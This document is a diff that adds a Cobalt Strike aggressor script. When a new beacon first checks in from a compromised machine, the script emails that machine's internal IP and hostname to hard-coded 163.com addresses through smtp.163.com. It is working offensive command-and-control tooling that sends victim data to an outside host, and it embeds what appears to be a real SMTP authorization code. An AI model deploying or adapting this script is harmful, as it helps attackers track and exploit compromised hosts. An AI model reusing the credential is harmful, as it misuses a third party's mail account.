@@ -1,0 +1,20 @@
+import email.lei.Main from: cna_mail.jar;
+on beacon_initial {
+
+foreach $entry (beacons()) {
+ 
+    			   if($entry['id'] == $1){
+@account = @("xxx@163.com","xxx@163.com");
+$value = [new Main];
+[$value setValue : "xxxxxx@163.com","qyeycemagybdijgc","smtp.163.com",@account,$entry['computer'],"fajianren",,"Target ip:" . $entry['internal'] . " Target host: " . $entry['computer']];
+[$value  start];
+ 
+}
+}
+}
+
+
+
+
+
+
